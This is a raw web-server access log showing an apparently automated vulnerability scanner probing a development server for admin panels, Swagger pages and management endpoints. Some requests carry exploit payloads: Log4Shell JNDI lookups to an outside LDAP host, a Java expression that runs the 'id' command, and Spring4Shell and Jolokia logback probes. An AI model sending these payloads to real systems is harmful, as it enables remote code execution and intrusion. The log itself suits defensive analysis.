2024-09-19 10:27:32,538.538 INFO [Thread-352 (process_request_thread)] [_internal.py:97] - 10.248.221.206 - - [19/Sep/2024 10:27:32] "[33mGET /unified-console.html HTTP/1.1[0m" 404 -
2024-09-19 10:27:32,757.757 INFO [Thread-353 (process_request_thread)] [_internal.py:97] - 10.248.221.206 - - [19/Sep/2024 10:27:32] "[33mGET /swagger/swagger-ui.html HTTP/1.1[0m" 404 -
2024-09-19 10:27:32,977.977 INFO [Thread-354 (process_request_thread)] [_internal.py:97] - 10.248.221.206 - - [19/Sep/2024 10:27:32] "[33mGET /user-login.html HTTP/1.1[0m" 404 -
2024-09-19 10:27:33,196.196 INFO [Thread-355 (process_request_thread)] [_internal.py:97] - 10.248.221.206 - - [19/Sep/2024 10:27:33] "[33mGET /nexus/ HTTP/1.1[0m" 404 -
2024-09-19 10:27:33,416.416 INFO [Thread-356 (process_request_thread)] [_internal.py:97] - 10.248.221.206 - - [19/Sep/2024 10:27:33] "[33mGET /devices HTTP/1.1[0m" 404 -
2024-09-19 10:27:33,534.534 INFO [Thread-357 (process_request_thread)] [_internal.py:97] - 10.248.221.206 - - [19/Sep/2024 10:27:33] "[33mGET /nacos/ HTTP/1.1[0m" 404 -
2024-09-19 10:27:33,757.757 INFO [Thread-358 (process_request_thread)] [_internal.py:97] - 10.248.221.206 - - [19/Sep/2024 10:27:33] "[33mGET /login HTTP/1.1[0m" 404 -
2024-09-19 10:27:33,977.977 INFO [Thread-359 (process_request_thread)] [_internal.py:97] - 10.248.221.206 - - [19/Sep/2024 10:27:33] "[33mGET /jenkins HTTP/1.1[0m" 404 -
2024-09-19 10:27:34,198.198 INFO [Thread-360 (process_request_thread)] [_internal.py:97] - 10.248.221.206 - - [19/Sep/2024 10:27:34] "[33mGET /swagger/index.html HTTP/1.1[0m" 404 -
2024-09-19 10:27:34,417.417 INFO [Thread-361 (process_request_thread)] [_internal.py:97] - 10.248.221.206 - - [19/Sep/2024 10:27:34] "[33mGET /dfshealth.html HTTP/1.1[0m" 404 -
2024-09-19 10:27:34,538.538 INFO [Thread-362 (process_request_thread)] [_internal.py:97] - 10.248.221.206 - - [19/Sep/2024 10:27:34] "[33mGET /k3cloud/ HTTP/1.1[0m" 404 -
2024-09-19 10:27:37,824.824 INFO [Thread-363 (process_request_thread)] [_internal.py:97] - 10.185.44.118 - - [19/Sep/2024 10:27:37] "[33mGET /xxl-job-admin/api HTTP/1.1[0m" 404 -
2024-09-19 10:27:37,840.840 INFO [Thread-364 (process_request_thread)] [_internal.py:97] - 10.185.44.118 - - [19/Sep/2024 10:27:37] "[33mGET /api HTTP/1.1[0m" 404 -
2024-09-19 10:27:37,862.862 INFO [Thread-365 (process_request_thread)] [_internal.py:97] - 10.185.44.118 - - [19/Sep/2024 10:27:37] "[33mGET /ea-job-admin/api HTTP/1.1[0m" 404 -
2024-09-19 10:27:38,275.275 INFO [Thread-366 (process_request_thread)] [_internal.py:97] - 10.185.44.118 - - [19/Sep/2024 10:27:38] "[33mPOST / HTTP/1.1[0m" 404 -
2024-09-19 10:27:38,296.296 INFO [Thread-367 (process_request_thread)] [_internal.py:97] - 10.185.44.118 - - [19/Sep/2024 10:27:38] "[33mPOST /login HTTP/1.1[0m" 404 -
2024-09-19 10:27:38,318.318 INFO [Thread-368 (process_request_thread)] [_internal.py:97] - 10.185.44.118 - - [19/Sep/2024 10:27:38] "[33mPOST /cas/login HTTP/1.1[0m" 404 -
2024-09-19 10:27:38,557.557 INFO [Thread-369 (process_request_thread)] [_internal.py:97] - 10.185.44.118 - - [19/Sep/2024 10:27:38] "[33mGET / HTTP/1.1[0m" 404 -
2024-09-19 10:27:38,795.795 INFO [Thread-370 (process_request_thread)] [_internal.py:97] - 10.185.44.118 - - [19/Sep/2024 10:27:38] "[33mGET / HTTP/1.1[0m" 404 -
2024-09-19 10:27:39,041.041 INFO [Thread-371 (process_request_thread)] [_internal.py:97] - 10.185.44.118 - - [19/Sep/2024 10:27:39] "[33mGET / HTTP/1.1[0m" 404 -
2024-09-19 10:27:39,061.061 INFO [Thread-372 (process_request_thread)] [_internal.py:97] - 10.185.44.118 - - [19/Sep/2024 10:27:39] "[33mGET / HTTP/1.1[0m" 404 -
2024-09-19 10:27:39,079.079 INFO [Thread-373 (process_request_thread)] [_internal.py:97] - 10.185.44.118 - - [19/Sep/2024 10:27:39] "[33mGET /${jndi:ldap://cn.oast-cn.byted-dast.com/realtime/active-scan-cn/deserialization/log4j2/xwcm52m4mrby5v1d} HTTP/1.1[0m" 404 -
2024-09-19 10:27:39,096.096 INFO [Thread-374 (process_request_thread)] [_internal.py:97] - 10.185.44.118 - - [19/Sep/2024 10:27:39] "[33mGET /?${jndi:ldap://cn.oast-cn.byted-dast.com/realtime/active-scan-cn/deserialization/log4j2/xwcm52m4mrby5v1d} HTTP/1.1[0m" 404 -
2024-09-19 10:27:39,114.114 INFO [Thread-375 (process_request_thread)] [_internal.py:97] - 10.185.44.118 - - [19/Sep/2024 10:27:39] "[33mPOST / HTTP/1.1[0m" 404 -
2024-09-19 10:27:39,131.131 INFO [Thread-376 (process_request_thread)] [_internal.py:97] - 10.185.44.118 - - [19/Sep/2024 10:27:39] "[33mPUT / HTTP/1.1[0m" 404 -
2024-09-19 10:27:42,347.347 INFO [Thread-377 (process_request_thread)] [_internal.py:97] - 10.185.44.118 - - [19/Sep/2024 10:27:42] "[33mGET /actuator/jolokia/list/ HTTP/1.1[0m" 404 -
2024-09-19 10:27:42,367.367 INFO [Thread-378 (process_request_thread)] [_internal.py:97] - 10.185.44.118 - - [19/Sep/2024 10:27:42] "[33mGET /jolokia/list/ HTTP/1.1[0m" 404 -
2024-09-19 10:27:42,501.501 ERROR [Thread-379 (process_request_thread)] [_internal.py:97] - 10.185.44.118 - - [19/Sep/2024 10:27:42] code 400, message Bad request version ("ë\x10.h\x19\x86£ó\x7f·Ê\x9fÕ\x14ÞÌl\x11u\x84Ú¾^L\x9c@x³Èþ-\x9f\x00V\x13\x02\x13\x03\x13\x01À,À0À+À/Ì©Ì¨\x00\x9f\x00\x9eÌªÀ¯À\xadÀ®À¬À$À(À#À'À")
2024-09-19 10:27:42,501.501 INFO [Thread-379 (process_request_thread)] [_internal.py:97] - 10.185.44.118 - - [19/Sep/2024 10:27:42] "[31m[1m\x16\x03\x01\x01G\x01\x00\x01C\x03\x03£Ü¾pÎ­RXP\x16\x0bÃCDf\x18\x13\x0d\x8fÝ(¶\x18{°9v\x0e5Zß\x08 ë\x10.h\x19\x86£ó\x7f·Ê\x9fÕ\x14ÞÌl\x11u\x84Ú¾^L\x9c@x³Èþ-\x9f\x00V\x13\x02\x13\x03\x13\x01À,À0À+À/Ì©Ì¨\x00\x9f\x00\x9eÌªÀ¯À­À®À¬À$À(À#À'À[0m" 400 -
2024-09-19 10:27:42,634.634 INFO [Thread-380 (process_request_thread)] [_internal.py:97] - 10.185.44.118 - - [19/Sep/2024 10:27:42] "[33mGET /v1/agent/self HTTP/1.1[0m" 404 -
2024-09-19 10:27:42,721.721 INFO [Thread-381 (process_request_thread)] [_internal.py:97] - 10.185.44.118 - - [19/Sep/2024 10:27:42] "[33mGET / HTTP/1.1[0m" 404 -
2024-09-19 10:27:42,745.745 INFO [Thread-382 (process_request_thread)] [_internal.py:97] - 10.185.44.118 - - [19/Sep/2024 10:27:42] "[33mGET /h2-console HTTP/1.1[0m" 404 -
2024-09-19 10:27:43,601.601 INFO [Thread-383 (process_request_thread)] [_internal.py:97] - 10.185.44.118 - - [19/Sep/2024 10:27:43] "[33mGET /__${new%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x HTTP/1.1[0m" 404 -
2024-09-19 10:27:44,283.283 INFO [Thread-384 (process_request_thread)] [_internal.py:97] - 10.185.44.118 - - [19/Sep/2024 10:27:44] "[33mGET /?class.module.classLoader[0]=test HTTP/1.1[0m" 404 -
2024-09-19 10:27:44,357.357 INFO [Thread-385 (process_request_thread)] [_internal.py:97] - 10.185.44.118 - - [19/Sep/2024 10:27:44] "[33mGET / HTTP/1.1[0m" 404 -
2024-09-19 10:27:44,376.376 INFO [Thread-386 (process_request_thread)] [_internal.py:97] - 10.185.44.118 - - [19/Sep/2024 10:27:44] "[33mGET /h2-console HTTP/1.1[0m" 404 -
2024-09-19 10:27:44,626.626 INFO [Thread-387 (process_request_thread)] [_internal.py:97] - 10.185.44.118 - - [19/Sep/2024 10:27:44] "[31m[1mGET /console HTTP/1.1[0m" 400 -
2024-09-19 10:27:45,091.091 INFO [Thread-388 (process_request_thread)] [_internal.py:97] - 10.185.44.118 - - [19/Sep/2024 10:27:45] "[33mGET /jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/127.0.0.1:22222!/logback.xml HTTP/1.1[0m" 404 -
2024-09-25 09:15:24,261.261 ERROR [Thread-389 (process_request_thread)] [_internal.py:97] - 10.185.28.19 - - [25/Sep/2024 09:15:24] code 400, message Bad request version ('\x00{\x000\x000\x000\x000\x00A\x00A\x000\x000\x00-\x000\x00A\x000\x000\x00-\x000\x000\x00a\x000\x00-\x00A\x00A\x000\x00A\x00-\x000\x000\x000\x000\x00A\x000\x00A\x00A\x000\x00A\x00A\x000\x00}\x00\x00\x00àmß_')
2024-09-25 09:15:24,262.262 INFO [Thread-389 (process_request_thread)] [_internal.py:97] - 10.185.28.19 - - [25/Sep/2024 09:15:24] "[31m[1m\x01\x00\x00ýÎú\x0b° \x00\x00\x00MMS\x14\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x12\x00\x00\x00\x01\x00\x03\x00ðððð\x0b\x00\x04\x00\x1c\x00\x03\x00N\x00S\x00P\x00l\x00a\x00y\x00e\x00r\x00/\x009\x00.\x000\x00.\x000\x00.\x002\x009\x008\x000\x00;\x00 \x00{\x000\x000\x000\x000\x00A\x00A\x000\x000\x00-\x000\x00A\x000\x000\x00-\x000\x000\x00a\x000\x00-\x00A\x00A\x000\x00A\x00-\x000\x000\x000\x000\x00A\x000\x00A\x00A\x000\x00A\x00A\x000\x00}\x00\x00\x00àmß_[0m" 400 -
2024-09-25 09:15:29,269.269 ERROR [Thread-390 (process_request_thread)] [_internal.py:97] - 10.185.28.19 - - [25/Sep/2024 09:15:29] code 400, message Bad request version ('GetClassName\x00\x00\x00\x02\x04\x00\x00\x00\x00\x01\x00')
2024-09-25 09:15:29,270.270 INFO [Thread-390 (process_request_thread)] [_internal.py:97] - 10.185.28.19 - - [25/Sep/2024 09:15:29] "[31m[1m\x00\x00\x00\x1f\x00\x00\x00\x00\x00\x00\x00\x0cGetClassName\x00\x00\x00\x02\x04\x00\x00\x00\x00\x01\x00[0m" 400 -
2024-09-25 09:15:29,285.285 INFO [Thread-392 (process_request_thread)] [_internal.py:97] - 10.185.28.19 - - [25/Sep/2024 09:15:29] "[33mGET / HTTP/1.1[0m" 404 -
2024-09-25 09:18:56,907.907 INFO [Thread-393 (process_request_thread)] [_internal.py:97] - 10.185.28.19 - - [25/Sep/2024 09:18:56] "[33mGET / HTTP/1.1[0m" 404 -
2024-09-25 09:19:18,257.257 INFO [Thread-394 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [25/Sep/2024 09:19:18] "[33mGET / HTTP/1.1[0m" 404 -
2024-09-25 09:19:18,274.274 INFO [Thread-395 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [25/Sep/2024 09:19:18] "[33mGET /w1WkKhIc HTTP/1.1[0m" 404 -
2024-09-25 09:19:18,292.292 INFO [Thread-396 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [25/Sep/2024 09:19:18] "[33mGET /services/Version HTTP/1.1[0m" 404 -
2024-09-25 09:19:18,310.310 INFO [Thread-397 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [25/Sep/2024 09:19:18] "[33mGET /login HTTP/1.1[0m" 404 -
2024-09-25 09:19:18,326.326 INFO [Thread-398 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [25/Sep/2024 09:19:18] "[33mGET /dfshealth.html HTTP/1.1[0m" 404 -
2024-09-25 09:19:18,544.544 INFO [Thread-399 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [25/Sep/2024 09:19:18] "[33mGET /login.html HTTP/1.1[0m" 404 -
2024-09-25 09:19:18,688.688 INFO [Thread-400 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [25/Sep/2024 09:19:18] "[33mGET /dsview/protected/login.do HTTP/1.1[0m" 404 -
2024-09-25 09:19:18,906.906 INFO [Thread-401 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [25/Sep/2024 09:19:18] "[33mGET /nexus/ HTTP/1.1[0m" 404 -
2024-09-25 09:19:19,124.124 INFO [Thread-402 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [25/Sep/2024 09:19:19] "[33mGET /swagger/swagger-ui.html HTTP/1.1[0m" 404 -
2024-09-25 09:19:19,343.343 INFO [Thread-403 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [25/Sep/2024 09:19:19] "[33mGET /nmc/login HTTP/1.1[0m" 404 -
2024-09-25 09:19:19,462.462 INFO [Thread-404 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [25/Sep/2024 09:19:19] "[33mGET /swagger/ HTTP/1.1[0m" 404 -
2024-09-25 09:19:19,681.681 INFO [Thread-405 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [25/Sep/2024 09:19:19] "[33mGET /swagger/index.html HTTP/1.1[0m" 404 -
2024-09-25 09:19:19,901.901 INFO [Thread-406 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [25/Sep/2024 09:19:19] "[33mGET /cas/login HTTP/1.1[0m" 404 -
2024-09-25 09:19:20,120.120 INFO [Thread-407 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [25/Sep/2024 09:19:20] "[33mGET /healthz HTTP/1.1[0m" 404 -
2024-09-25 09:19:20,339.339 INFO [Thread-408 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [25/Sep/2024 09:19:20] "[33mGET /ui/ HTTP/1.1[0m" 404 -
2024-09-25 09:19:20,457.457 INFO [Thread-409 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [25/Sep/2024 09:19:20] "[33mGET /webapps/primus/ HTTP/1.1[0m" 404 -
2024-09-25 09:19:20,680.680 INFO [Thread-410 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [25/Sep/2024 09:19:20] "[33mGET /nacos/ HTTP/1.1[0m" 404 -
2024-09-25 09:19:20,899.899 INFO [Thread-411 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [25/Sep/2024 09:19:20] "[33mGET /swagger-ui/ HTTP/1.1[0m" 404 -
2024-09-25 09:19:21,121.121 INFO [Thread-412 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [25/Sep/2024 09:19:21] "[33mGET /api-docs/ HTTP/1.1[0m" 404 -
2024-09-25 09:19:21,340.340 INFO [Thread-413 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [25/Sep/2024 09:19:21] "[33mGET /user-login.html HTTP/1.1[0m" 404 -
2024-09-25 09:19:21,461.461 INFO [Thread-414 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [25/Sep/2024 09:19:21] "[33mGET /static/apidoc/ HTTP/1.1[0m" 404 -
2024-09-25 09:19:21,680.680 INFO [Thread-415 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [25/Sep/2024 09:19:21] "[33mGET /swagger.yaml HTTP/1.1[0m" 404 -
2024-09-25 09:19:21,897.897 INFO [Thread-416 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [25/Sep/2024 09:19:21] "[33mGET /core/auth/login/ HTTP/1.1[0m" 404 -
2024-09-25 09:19:22,118.118 INFO [Thread-417 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [25/Sep/2024 09:19:22] "[33mGET /cas HTTP/1.1[0m" 404 -
2024-09-25 09:19:22,337.337 INFO [Thread-418 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [25/Sep/2024 09:19:22] "[33mGET /png/ HTTP/1.1[0m" 404 -
2024-09-25 09:19:22,555.555 INFO [Thread-419 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [25/Sep/2024 09:19:22] "[33mGET /doc/index.html HTTP/1.1[0m" 404 -
2024-09-25 09:19:22,671.671 INFO [Thread-420 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [25/Sep/2024 09:19:22] "[33mGET /ws/v1/cluster/info HTTP/1.1[0m" 404 -
2024-09-25 09:19:22,892.892 INFO [Thread-421 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [25/Sep/2024 09:19:22] "[33mGET /jenkins HTTP/1.1[0m" 404 -
2024-09-25 09:19:23,110.110 INFO [Thread-422 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [25/Sep/2024 09:19:23] "[33mGET /index?as_more HTTP/1.1[0m" 404 -
2024-09-25 09:19:23,326.326 INFO [Thread-423 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [25/Sep/2024 09:19:23] "[33mGET /devices HTTP/1.1[0m" 404 -
2024-09-25 09:19:23,543.543 INFO [Thread-424 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [25/Sep/2024 09:19:23] "[33mGET /version HTTP/1.1[0m" 404 -
2024-09-25 09:19:23,659.659 INFO [Thread-425 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [25/Sep/2024 09:19:23] "[33mGET /swagger.json HTTP/1.1[0m" 404 -
2024-09-25 09:19:23,877.877 INFO [Thread-426 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [25/Sep/2024 09:19:23] "[33mGET /api/docs HTTP/1.1[0m" 404 -
2024-09-25 09:19:24,094.094 INFO [Thread-427 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [25/Sep/2024 09:19:24] "[33mGET /v2/api-docs/ HTTP/1.1[0m" 404 -
2024-09-25 09:19:24,312.312 INFO [Thread-428 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [25/Sep/2024 09:19:24] "[33mGET /zabbix HTTP/1.1[0m" 404 -
2024-09-25 09:19:24,531.531 INFO [Thread-429 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [25/Sep/2024 09:19:24] "[33mGET /k3cloud/ HTTP/1.1[0m" 404 -
2024-09-25 09:19:24,748.748 INFO [Thread-430 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [25/Sep/2024 09:19:24] "[33mGET /docs HTTP/1.1[0m" 404 -
2024-09-25 09:19:24,865.865 INFO [Thread-431 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [25/Sep/2024 09:19:24] "[33mGET /clickhouse/data/query HTTP/1.1[0m" 404 -
2024-09-25 09:19:25,084.084 INFO [Thread-432 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [25/Sep/2024 09:19:25] "[33mGET /unified-console.html HTTP/1.1[0m" 404 -
2024-09-25 09:19:25,302.302 INFO [Thread-433 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [25/Sep/2024 09:19:25] "[33mGET /swagger-ui.html HTTP/1.1[0m" 404 -
2024-09-25 09:19:25,522.522 INFO [Thread-434 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [25/Sep/2024 09:19:25] "[33mGET /?query= HTTP/1.1[0m" 404 -
2024-09-25 09:19:29,405.405 INFO [Thread-435 (process_request_thread)] [_internal.py:97] - 10.174.105.76 - - [25/Sep/2024 09:19:29] "[33mGET /xxl-job-admin/api HTTP/1.1[0m" 404 -
2024-09-25 09:19:29,417.417 INFO [Thread-436 (process_request_thread)] [_internal.py:97] - 10.174.105.76 - - [25/Sep/2024 09:19:29] "[33mGET /api HTTP/1.1[0m" 404 -
2024-09-25 09:19:29,428.428 INFO [Thread-437 (process_request_thread)] [_internal.py:97] - 10.174.105.76 - - [25/Sep/2024 09:19:29] "[33mGET /ea-job-admin/api HTTP/1.1[0m" 404 -
2024-09-25 09:19:29,822.822 INFO [Thread-438 (process_request_thread)] [_internal.py:97] - 10.174.105.76 - - [25/Sep/2024 09:19:29] "[33mPOST / HTTP/1.1[0m" 404 -
2024-09-25 09:19:29,832.832 INFO [Thread-439 (process_request_thread)] [_internal.py:97] - 10.174.105.76 - - [25/Sep/2024 09:19:29] "[33mPOST /login HTTP/1.1[0m" 404 -
2024-09-25 09:19:29,845.845 INFO [Thread-440 (process_request_thread)] [_internal.py:97] - 10.174.105.76 - - [25/Sep/2024 09:19:29] "[33mPOST /cas/login HTTP/1.1[0m" 404 -
2024-09-25 09:19:30,129.129 INFO [Thread-441 (process_request_thread)] [_internal.py:97] - 10.174.105.76 - - [25/Sep/2024 09:19:30] "[33mGET / HTTP/1.1[0m" 404 -
2024-09-25 09:19:30,359.359 INFO [Thread-442 (process_request_thread)] [_internal.py:97] - 10.174.105.76 - - [25/Sep/2024 09:19:30] "[33mGET / HTTP/1.1[0m" 404 -
2024-09-25 09:19:30,595.595 INFO [Thread-443 (process_request_thread)] [_internal.py:97] - 10.174.105.76 - - [25/Sep/2024 09:19:30] "[33mGET / HTTP/1.1[0m" 404 -
2024-09-25 09:19:30,605.605 INFO [Thread-444 (process_request_thread)] [_internal.py:97] - 10.174.105.76 - - [25/Sep/2024 09:19:30] "[33mGET / HTTP/1.1[0m" 404 -
2024-09-25 09:19:30,615.615 INFO [Thread-445 (process_request_thread)] [_internal.py:97] - 10.174.105.76 - - [25/Sep/2024 09:19:30] "[33mGET /${jndi:ldap://cn.oast-cn.byted-dast.com/realtime/active-scan-cn/deserialization/log4j2/mzk96cf5mnk248js} HTTP/1.1[0m" 404 -
2024-09-25 09:19:30,627.627 INFO [Thread-446 (process_request_thread)] [_internal.py:97] - 10.174.105.76 - - [25/Sep/2024 09:19:30] "[33mGET /?${jndi:ldap://cn.oast-cn.byted-dast.com/realtime/active-scan-cn/deserialization/log4j2/mzk96cf5mnk248js} HTTP/1.1[0m" 404 -
2024-09-25 09:19:30,637.637 INFO [Thread-447 (process_request_thread)] [_internal.py:97] - 10.174.105.76 - - [25/Sep/2024 09:19:30] "[33mPOST / HTTP/1.1[0m" 404 -
2024-09-25 09:19:30,652.652 INFO [Thread-448 (process_request_thread)] [_internal.py:97] - 10.174.105.76 - - [25/Sep/2024 09:19:30] "[33mPUT / HTTP/1.1[0m" 404 -
2024-09-25 09:19:33,845.845 INFO [Thread-449 (process_request_thread)] [_internal.py:97] - 10.174.105.76 - - [25/Sep/2024 09:19:33] "[33mGET /actuator/jolokia/list/ HTTP/1.1[0m" 404 -
2024-09-25 09:19:33,858.858 INFO [Thread-450 (process_request_thread)] [_internal.py:97] - 10.174.105.76 - - [25/Sep/2024 09:19:33] "[33mGET /jolokia/list/ HTTP/1.1[0m" 404 -
2024-09-25 09:19:33,984.984 ERROR [Thread-451 (process_request_thread)] [_internal.py:97] - 10.174.105.76 - - [25/Sep/2024 09:19:33] code 400, message Bad request version ("/¶ª\x9brµÞìÑ9\x08³~¢üì\x8fè\x04â¹\x831\x87\x96¯U\x7f\x00V\x13\x02\x13\x03\x13\x01À,À0À+À/Ì©Ì¨\x00\x9f\x00\x9eÌªÀ¯À\xadÀ®À¬À$À(À#À'À")
2024-09-25 09:19:33,984.984 INFO [Thread-451 (process_request_thread)] [_internal.py:97] - 10.174.105.76 - - [25/Sep/2024 09:19:33] "[31m[1m\x16\x03\x01\x01G\x01\x00\x01C\x03\x03\x15^¦×\x08@ÝÒ\x0c8\x14 Ê\x07¥ß\x94Ò?¥ò\x0d¹\x80 #À\x14YÔØ\x84 Vã\x81\x1e/¶ª\x9brµÞìÑ9\x08³~¢üì\x8fè\x04â¹\x831\x87\x96¯U\x7f\x00V\x13\x02\x13\x03\x13\x01À,À0À+À/Ì©Ì¨\x00\x9f\x00\x9eÌªÀ¯À­À®À¬À$À(À#À'À[0m" 400 -
2024-09-25 09:19:34,107.107 INFO [Thread-452 (process_request_thread)] [_internal.py:97] - 10.174.105.76 - - [25/Sep/2024 09:19:34] "[33mGET /v1/agent/self HTTP/1.1[0m" 404 -
2024-09-25 09:19:34,176.176 INFO [Thread-453 (process_request_thread)] [_internal.py:97] - 10.174.105.76 - - [25/Sep/2024 09:19:34] "[33mGET / HTTP/1.1[0m" 404 -
2024-09-25 09:19:34,189.189 INFO [Thread-454 (process_request_thread)] [_internal.py:97] - 10.174.105.76 - - [25/Sep/2024 09:19:34] "[33mGET /h2-console HTTP/1.1[0m" 404 -
2024-09-25 09:19:35,018.018 INFO [Thread-455 (process_request_thread)] [_internal.py:97] - 10.174.105.76 - - [25/Sep/2024 09:19:35] "[33mGET /__${new%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x HTTP/1.1[0m" 404 -
2024-09-25 09:19:35,692.692 INFO [Thread-456 (process_request_thread)] [_internal.py:97] - 10.174.105.76 - - [25/Sep/2024 09:19:35] "[33mGET /?class.module.classLoader[0]=test HTTP/1.1[0m" 404 -
2024-09-25 09:19:35,758.758 INFO [Thread-457 (process_request_thread)] [_internal.py:97] - 10.174.105.76 - - [25/Sep/2024 09:19:35] "[33mGET / HTTP/1.1[0m" 404 -
2024-09-25 09:19:35,771.771 INFO [Thread-458 (process_request_thread)] [_internal.py:97] - 10.174.105.76 - - [25/Sep/2024 09:19:35] "[33mGET /h2-console HTTP/1.1[0m" 404 -
2024-09-25 09:19:36,003.003 INFO [Thread-459 (process_request_thread)] [_internal.py:97] - 10.174.105.76 - - [25/Sep/2024 09:19:36] "[31m[1mGET /console HTTP/1.1[0m" 400 -
2024-09-25 09:19:36,453.453 INFO [Thread-460 (process_request_thread)] [_internal.py:97] - 10.174.105.76 - - [25/Sep/2024 09:19:36] "[33mGET /jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/127.0.0.1:22222!/logback.xml HTTP/1.1[0m" 404 -
2024-10-09 17:01:31,438.438 ERROR [Thread-461 (process_request_thread)] [_internal.py:97] - 10.185.64.144 - - [09/Oct/2024 17:01:31] code 400, message Bad request version ('\x00{\x000\x000\x000\x000\x00A\x00A\x000\x000\x00-\x000\x00A\x000\x000\x00-\x000\x000\x00a\x000\x00-\x00A\x00A\x000\x00A\x00-\x000\x000\x000\x000\x00A\x000\x00A\x00A\x000\x00A\x00A\x000\x00}\x00\x00\x00àmß_')
2024-10-09 17:01:31,440.440 INFO [Thread-461 (process_request_thread)] [_internal.py:97] - 10.185.64.144 - - [09/Oct/2024 17:01:31] "[31m[1m\x01\x00\x00ýÎú\x0b° \x00\x00\x00MMS\x14\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x12\x00\x00\x00\x01\x00\x03\x00ðððð\x0b\x00\x04\x00\x1c\x00\x03\x00N\x00S\x00P\x00l\x00a\x00y\x00e\x00r\x00/\x009\x00.\x000\x00.\x000\x00.\x002\x009\x008\x000\x00;\x00 \x00{\x000\x000\x000\x000\x00A\x00A\x000\x000\x00-\x000\x00A\x000\x000\x00-\x000\x000\x00a\x000\x00-\x00A\x00A\x000\x00A\x00-\x000\x000\x000\x000\x00A\x000\x00A\x00A\x000\x00A\x00A\x000\x00}\x00\x00\x00àmß_[0m" 400 -
2024-10-09 17:01:36,448.448 ERROR [Thread-462 (process_request_thread)] [_internal.py:97] - 10.185.64.144 - - [09/Oct/2024 17:01:36] code 400, message Bad request version ('GetClassName\x00\x00\x00\x02\x04\x00\x00\x00\x00\x01\x00')
